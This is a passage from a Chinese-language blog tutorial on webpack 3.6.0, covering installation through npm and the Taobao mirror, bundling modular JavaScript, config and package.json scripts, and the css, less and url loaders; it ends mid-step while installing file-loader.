title="webpack安装"></a>webpack安装</h2><p>安装webpack首先需要安装Node.js，Node.js自带了软件包管理工具npm。</p><ul><li><p>查看自己的node版本：<code>node -v</code></p></li><li><p>使用淘宝镜像的命令(国内使用npm下载安装有点慢)：</p><p><code>npm install -g cnpm --registry=https://registry.npm.taobao.org</code></p></li><li><p>或者把npm的下载源改为淘宝源：</p><p><code>npm config set registry https://registry.npm.taobao.org</code></p></li><li><p>全局安装webpack（这里先指定版本号3.6.0，因为vue cli2依赖该版本，-g表示全局安装）</p><p><code>cnpm install webpack@3.6.0 -g</code></p></li><li><p>局部安装webpack（–save-dev是开发时依赖）</p><p><code>cnpm install webpack@3.6.0 --save-dev</code></p></li></ul><blockquote><p>为什么全局安装后，还需要局部安装呢？</p><ul><li>在终端直接执行webpack命令，使用的全局安装的webpack。</li><li>当在package.json中定义了scripts时，其中包含了webpack命令，那么使用的是局部webpack。</li><li>局部安装可以让每个项目拥有独立的包，不受全局包的影响，方便项目的移动、复制、打包等，<strong>保证不同版本包之间的相互依赖</strong>，这些优点是全局安装难以做到的。</li></ul></blockquote><ul><li><p>使用npm卸载依赖也很慢，所以我们也可以使用cnpm卸载：</p><p><code>cnpm uninstall webpack@3.6.0 -g</code></p></li><li><p>这时会出现”up to date in …“，这是npm和cnpm的全局模块地址不同造成的。</p><ul><li>先获取npm全局模块地址 <code>npm config get prefix</code></li><li>再设置cnpm全局模块地址 <code>cnpm config set prefix &lt;npm全局模块地址&gt;</code></li><li>然后就可以通过cnpm卸载了</li></ul></li></ul><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>文件和文件夹解析：</p><ul><li><p>dist文件夹：用于存放之后打包的文件</p></li><li><p>src文件夹：用于存放我们写的源文件</p><ul><li>mathUtils.js：定义了一些数学工具函数，可以在其他地方引用并且使用。</li><li>info.js：定义了一些变量。</li><li>main.js：项目的入口文件。</li></ul></li><li><p>index.html：浏览器打开展示的首页html</p></li><li><p>package.json：通过<code>npm init</code>生成的，npm包管理的文件</p></li></ul><hr><p>mathUtils.js如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">add</span>(<span class="params">num1, num2</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> num1 + num2</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">mul</span>(<span class="params">num1, num2</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> num1 * num2</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  add,</span><br><span class="line">  mul</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>info.js如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> name = <span class="string">&#x27;nan&#x27;</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> age = <span class="number">18</span>;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> height = <span class="number">1.88</span>;</span><br></pre></td></tr></table></figure><p>main.js如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1.使用commonjs的模块化规范</span></span><br><span class="line"><span class="keyword">const</span> &#123;add, mul&#125; = <span class="built_in">require</span>(<span class="string">&#x27;./mathUtils.js&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">add</span>(<span class="number">20</span>, <span class="number">30</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">mul</span>(<span class="number">20</span>, <span class="number">30</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.使用ES6的模块化的规范</span></span><br><span class="line"><span class="keyword">import</span> &#123;name, age, height&#125; <span class="keyword">from</span> <span class="string">&quot;./info&quot;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(name);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(age);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(height)</span><br></pre></td></tr></table></figure><h2 id="js文件的打包"><a href="#js文件的打包" class="headerlink" title="js文件的打包"></a>js文件的打包</h2><p>现在的js文件中使用了模块化的方式进行开发，它们不可以直接使用。</p><p>因为如果直接在index.html引入这三个js文件，浏览器并不识别其中的模块化代码。另外，在真实项目中当有许多这样的js文件时，我们一个个引用非常麻烦，并且后期非常不方便对它们进行管理。</p><p>我们应该使用webpack工具，对多个js文件进行打包。<br>我们知道，webpack就是一个模块化的打包工具，所以它支持我们代码中写模块化，可以对模块化的代码进行处理。另外，如果在处理完所有模块之间的关系后，将多个js打包到一个js文件中，引入时就变得非常方便了。</p><p>在当前项目的控制台使用webpack的打包指令即可：<code>webpack src/main.js dist/bundle.js</code></p><h2 id="使用打包后的文件"><a href="#使用打包后的文件" class="headerlink" title="使用打包后的文件"></a>使用打包后的文件</h2><p>打包后会在dist文件下，生成一个bundle.js文件，这个文件是webpack处理了项目的直接文件依赖后生成的一个js文件，我们只需要将这个js文件在index.html中引入即可。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201104222230.png"></p><h1 id="webpack配置"><a href="#webpack配置" class="headerlink" title="webpack配置"></a>webpack配置</h1><h2 id="入口和出口"><a href="#入口和出口" class="headerlink" title="入口和出口"></a>入口和出口</h2><p>如果每次使用webpack的命令都需要写上入口和出口作为参数，就非常麻烦。<br>我们可以创建一个webpack.config.js文件，将这两个参数写到配置中，在运行时直接读取。</p><p>path是node_modules文件夹中的一个webpack自带模块，__dirname是获取当前配置文件的绝对路径。</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201104223404.png"></p><h2 id="局部安装webpack"><a href="#局部安装webpack" class="headerlink" title="局部安装webpack"></a>局部安装webpack</h2><ul><li>目前，我们使用的webpack是全局的webpack，如果我们想使用局部来打包呢？<ul><li>因为一个项目往往依赖特定的webpack版本，全局的版本可能跟这个项目的webpack版本不一致，导出打包容易出现问题。</li><li>所以通常一个项目都有自己局部的webpack。</li></ul></li><li>第一步，项目中需要安装自己局部的webpack<ul><li>这里我们将局部安装webpack的3.6.0版本</li><li>Vue CLI3中已经升级到webpack4，但是它将配置文件隐藏了起来，所以查看起来不是很方便。</li><li>安装命令：<code>cnpm install webpack@3.6.0 --save-dev</code></li></ul></li><li>第二步，通过<code>node_modules/.bin/webpack</code>启动webpack打包</li></ul><h2 id="package-json中定义启动"><a href="#package-json中定义启动" class="headerlink" title="package.json中定义启动"></a>package.json中定义启动</h2><p>但是每次执行都敲这么一长串很不方便，所以我们可以在package.json的<strong>scripts中</strong>定义自己的执行脚本。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;first&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1.0.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;main&quot;</span><span class="punctuation">:</span> <span class="string">&quot;index.js&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;test&quot;</span><span class="punctuation">:</span> <span class="string">&quot;echo \&quot;Error: no test specified\&quot; &amp;&amp; exit 1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;build&quot;</span><span class="punctuation">:</span> <span class="string">&quot;webpack&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;author&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;license&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ISC&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;devDependencies&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;webpack&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^3.6.0&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>package.json中的scripts的脚本在执行时，会按照一定的顺序寻找命令对应的位置。</p><ul><li>首先，会寻找本地的node_modules&#x2F;.bin路径中对应的命令。</li><li>如果没有找到，会去全局的环境变量中寻找。</li></ul><p>如何执行我们的build指令呢？<code>npm run build</code></p><h1 id="loader的使用"><a href="#loader的使用" class="headerlink" title="loader的使用"></a>loader的使用</h1><h2 id="什么是loader"><a href="#什么是loader" class="headerlink" title="什么是loader"></a>什么是loader</h2><p>loader是webpack中一个非常核心的概念。</p><p>在我们之前的实例中，我们主要用webpack来处理我们写的js代码，并且webpack会自动处理js之间相关的依赖。</p><p>但是，在开发中我们不仅仅有基本的js代码处理，我们也需要加载css、图片，也包括一些高级的将ES6转成ES5代码，将TypeScript转成ES5代码，将scss、less转成css，将.jsx、.vue文件转成js文件等等。</p><p>对于webpack本身的能力来说，对于这些转化是不支持的。但是给webpack扩展对应的loader就可以了。</p><p>loader使用过程：</p><ol><li>通过npm安装需要使用的loader</li><li>在webpack.config.js中的modules关键字下进行配置</li></ol><p><code>注意：此篇文章中所有安装的依赖需版本一致，否则容易出现错误！</code></p><p>本次webpack详解的最终package.json如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;first&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1.0.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;main&quot;</span><span class="punctuation">:</span> <span class="string">&quot;index.js&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;test&quot;</span><span class="punctuation">:</span> <span class="string">&quot;echo \&quot;Error: no test specified\&quot; &amp;&amp; exit 1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;build&quot;</span><span class="punctuation">:</span> <span class="string">&quot;webpack&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;dev&quot;</span><span class="punctuation">:</span> <span class="string">&quot;webpack-dev-server --open&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;author&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;license&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ISC&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;devDependencies&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;babel-core&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^6.26.3&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;babel-loader&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^7.1.5&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;babel-preset-es2015&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^6.24.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;css-loader&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^2.0.2&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;file-loader&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^3.0.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;html-webpack-plugin&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^3.2.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;less&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^3.9.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;less-loader&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^4.1.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;style-loader&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^0.23.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;uglifyjs-webpack-plugin&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^1.1.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url-loader&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^1.1.2&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;vue-loader&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^13.0.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;vue-template-compiler&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^2.6.12&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;webpack&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^3.6.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;webpack-dev-server&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^2.9.1&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;dependencies&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;vue&quot;</span><span class="punctuation">:</span> <span class="string">&quot;^2.6.12&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="css文件处理"><a href="#css文件处理" class="headerlink" title="css文件处理"></a>css文件处理</h2><p>项目开发过程中，我们必然需要添加很多的样式，而样式我们往往写到一个单独的文件中。</p><p>在src目录中，创建一个css文件，其中创建一个normal.css文件。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">   <span class="attribute">background-color</span>: pink;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们也可以重新组织文件的目录结构，将零散的js文件放在一个js文件夹中。</p><p>但是，这个时候normal.css中的样式不会生效，因为我们压根就没有引用它。</p><p>webpack也不可能找到它，因为我们只有一个入口，webpack会从入口开始查找其他依赖的文件。</p><p>所以我们需要在入口main.js中引用这个样式：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1.使用commonjs的模块化规范</span></span><br><span class="line"><span class="keyword">const</span> &#123;add, mul&#125; = <span class="built_in">require</span>(<span class="string">&#x27;./js/mathUtils.js&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">add</span>(<span class="number">20</span>, <span class="number">30</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">mul</span>(<span class="number">20</span>, <span class="number">30</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.使用ES6的模块化的规范</span></span><br><span class="line"><span class="keyword">import</span> &#123;name, age, height&#125; <span class="keyword">from</span> <span class="string">&quot;./js/info&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(name);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(age);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(height)</span><br><span class="line"></span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;./css/normal.css&quot;</span>)</span><br></pre></td></tr></table></figure><p>这时候我们执行打包命令会发现报错，这个error提示我们需要有一个合适的loader去处理这个文件类型（也就是css）。</p><p>在webpack的官方网站中，我们可以找到如下关于样式的loader使用方法：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201105102307.png"></p><p>webpack.config.js中的test是使用正则表达式匹配后缀为css的文件，use是使用了style-loader和css-loader。</p><p>需注意，如果我们只配置了css-loader，运行index.html，你会发现样式并没有生效。</p><p>原因是css-loader只负责加载css文件，但是并不负责将css具体样式嵌入到Dom中，这个工作是由style-loader来完成的。</p><p><strong>注意：</strong>style-loader需要放在css-loader的前面。因为webpack在读取使用的loader的过程中，是按照从右向左的顺序读取的。需先加载再嵌入。</p><p>安装命令及对应版本号：</p><p><code>cnpm install css-loader@2.0.2 --save-dev</code></p><p><code>cnpm install style-loader@0.23.1 --save-dev </code></p><p>最后执行<code>npm run build</code>就可以发现样式加载成功了。</p><h2 id="less文件处理"><a href="#less文件处理" class="headerlink" title="less文件处理"></a>less文件处理</h2><p>创建一个special.less文件并放入css文件夹中。</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">@fontColor:</span> orange;</span><br><span class="line"><span class="variable">@fontSize:</span> <span class="number">50px</span>;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">body</span>&#123;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="variable">@fontSize</span>;</span><br><span class="line">  <span class="attribute">color</span>: <span class="variable">@fontColor</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在入口main.js中引用这个样式：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1.使用commonjs的模块化规范</span></span><br><span class="line"><span class="keyword">const</span> &#123;add, mul&#125; = <span class="built_in">require</span>(<span class="string">&#x27;./js/mathUtils.js&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">add</span>(<span class="number">20</span>, <span class="number">30</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">mul</span>(<span class="number">20</span>, <span class="number">30</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2.使用ES6的模块化的规范</span></span><br><span class="line"><span class="keyword">import</span> &#123;name, age, height&#125; <span class="keyword">from</span> <span class="string">&quot;./js/info&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(name);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(age);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(height)</span><br><span class="line"></span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;./css/normal.css&quot;</span>)</span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;./css/special.less&quot;</span>)</span><br></pre></td></tr></table></figure><p>打包报错，继续在官网中查找，我们会找到 less-loader 相关的使用说明。</p><ul><li><p>首先，还是需要安装对应的loader：<code>cnpm install less-loader@4.1.0 less@3.9.0 --save-dev</code></p></li><li><p>注意：我们这里还安装了less，因为webpack会使用less对less文件进行编译。</p></li><li><p>其次，修改对应的配置文件web.config.js，添加一个rules选项，用于处理.less文件。</p></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">entry</span>: <span class="string">&#x27;./src/main.js&#x27;</span>,</span><br><span class="line">  <span class="attr">output</span>: &#123;</span><br><span class="line">    <span class="attr">path</span>: path.<span class="title function_">resolve</span>(__dirname, <span class="string">&#x27;dist&#x27;</span>),</span><br><span class="line">    <span class="attr">filename</span>: <span class="string">&quot;bundle.js&quot;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">module</span>: &#123;</span><br><span class="line">    <span class="attr">rules</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">test</span>: <span class="regexp">/\.css$/</span>,</span><br><span class="line">        <span class="attr">use</span>: [<span class="string">&#x27;style-loader&#x27;</span>, <span class="string">&#x27;css-loader&#x27;</span>]</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">test</span>: <span class="regexp">/\.less$/</span>,</span><br><span class="line">        <span class="attr">use</span>: [&#123;</span><br><span class="line">          <span class="attr">loader</span>: <span class="string">&quot;style-loader&quot;</span> <span class="comment">// creates style nodes from JS strings</span></span><br><span class="line">        &#125;, &#123;</span><br><span class="line">          <span class="attr">loader</span>: <span class="string">&quot;css-loader&quot;</span> <span class="comment">// translates CSS into CommonJS</span></span><br><span class="line">        &#125;, &#123;</span><br><span class="line">          <span class="attr">loader</span>: <span class="string">&quot;less-loader&quot;</span> <span class="comment">// compiles Less to CSS</span></span><br><span class="line">        &#125;]</span><br><span class="line">      &#125;,</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="图片文件处理"><a href="#图片文件处理" class="headerlink" title="图片文件处理"></a>图片文件处理</h2><p>首先，我们在项目中加入两张图片：一张较小的图片test01.jpg(小于8kb)，一张较大的图片test02.jpeg(大于8kb)</p><p>待会儿我们会针对这两张图片进行不同的处理。</p><p>我们先考虑在css样式中引用图片的情况，所以更改了normal.css中的样式：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">   <span class="comment">/*background-color: pink;*/</span></span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">url</span>(<span class="string">&quot;../img/test01.jpg&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果我们现在直接打包还是会报错。</p><p>图片处理，我们使用url-loader来处理，依然先安装url-loader：</p><p><code>cnpm install url-loader@1.1.2 --save-dev</code></p><p>修改webpack.config.js配置文件：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">entry</span>: <span class="string">&#x27;./src/main.js&#x27;</span>,</span><br><span class="line">  <span class="attr">output</span>: &#123;</span><br><span class="line">    <span class="attr">path</span>: path.<span class="title function_">resolve</span>(__dirname, <span class="string">&#x27;dist&#x27;</span>),</span><br><span class="line">    <span class="attr">filename</span>: <span class="string">&quot;bundle.js&quot;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">module</span>: &#123;</span><br><span class="line">    <span class="attr">rules</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">test</span>: <span class="regexp">/\.css$/</span>,</span><br><span class="line">        <span class="attr">use</span>: [<span class="string">&#x27;style-loader&#x27;</span>, <span class="string">&#x27;css-loader&#x27;</span>]</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">test</span>: <span class="regexp">/\.less$/</span>,</span><br><span class="line">        <span class="attr">use</span>: [&#123;</span><br><span class="line">          <span class="attr">loader</span>: <span class="string">&quot;style-loader&quot;</span> <span class="comment">// creates style nodes from JS strings</span></span><br><span class="line">        &#125;, &#123;</span><br><span class="line">          <span class="attr">loader</span>: <span class="string">&quot;css-loader&quot;</span> <span class="comment">// translates CSS into CommonJS</span></span><br><span class="line">        &#125;, &#123;</span><br><span class="line">          <span class="attr">loader</span>: <span class="string">&quot;less-loader&quot;</span> <span class="comment">// compiles Less to CSS</span></span><br><span class="line">        &#125;]</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">test</span>: <span class="regexp">/\.(png|jpg|gif|jpeg)$/</span>,</span><br><span class="line">        <span class="attr">use</span>: [</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="attr">loader</span>: <span class="string">&#x27;url-loader&#x27;</span>,</span><br><span class="line">            <span class="attr">options</span>: &#123;</span><br><span class="line">              <span class="attr">limit</span>: <span class="number">8192</span>,</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      &#125;,</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再次打包，运行index.html，就会发现我们的背景图片显示出来了。</p><p>仔细观察，背景图是通过base64显示的，这也是limit属性的作用，当图片小于8kb时，对图片进行base64编码：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201105110001.png"></p><p>那么问题来了，如果大于8kb呢？我们将background的图片改成test02.jpg，打包后报错了。</p><p>这次因为是大于8kb的图片，会通过file-loader进行处理，但是我们的项目中并没有file-loader。</p><p>所以，我们需要安装file-loader：<code>cnpm install file-loader@3.0.1 --save-dev 